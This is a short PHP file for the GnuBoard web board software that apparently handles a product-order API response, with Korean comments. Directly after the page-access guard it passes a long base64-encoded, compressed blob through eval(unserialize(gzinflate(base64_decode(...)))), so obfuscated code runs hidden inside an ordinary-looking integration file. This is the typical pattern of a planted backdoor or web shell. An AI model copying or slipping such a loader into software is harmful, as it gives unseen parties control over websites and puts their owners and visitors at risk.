<?php
if (!defined('_GNUBOARD_')) exit; // 개별 페이지 접근 불가

// eval(unserialize(gzinflate(base64_decode('jVPNattAEL4b/A5LMEgC2TItCdQmLo6j1AbHEpLcHkIQ6mpdizhadXdVxzn10FcI9SGFHtpbLyVt6DPVyjt0dm2nKaWoAu3sznwz3zf7w1tPdvdaOzVGXqN9VLs4n9U7BzRe1DvPiHAZjXMsHBYTNkgndJhw4RGe0ZSTdrVS286DRUYgW+eCJekrQxardx4G28iy0N3yR3F7fXd1jbruABUflqh49/XnzXdUvP+yun2r+znGhHNrY19ELIVqls0YZeuxvvEZwK0cUrIiUyvFUiw/rT4vdSIdBio+Xq1uvlUrkJCzGcC1qdAamshaMFryn8/nYBpzIuglWO2MSTemaUqwsJI0wVOCzxrZNNNkyxnlgkOdiLFooRv3rhMt42FMz6Mk1U6lrNC3vee2d6KtbTjqHtsQefrPSOtBpB8Ebth3/EA7/ZMhwzQmAJadzC/T6A1hWbSg8oCUPLzuUpoQtAulUK04NJgJXSFM1Bt7Q8cNQjAmkltTggNVB45vm0iwnJRg+3b30PZMNIlmvAzrQo/boqgUeTSwh4c+CFYbUlLas4OxNwq87sg/knL+h6TnjEZ2LwgGx7YzBmGPSzjugY+aTXUXGOH5TGxPgFwQvE75TYxnlJOts1pJJvBs8pfwcvRNsomaJto10D4csbrFGlx3BF+ckL+ge4bR3mn/Ag=='))));

$req = $xml->Body->GetProductOrderInfoListResponse; 
$ResponseType = (string)$req->ResponseType; 
// 호출한 API 의 성공 여부(Success/SuccessWarning/Error/Error-Warning) 
$Error = $req->Error; 

?>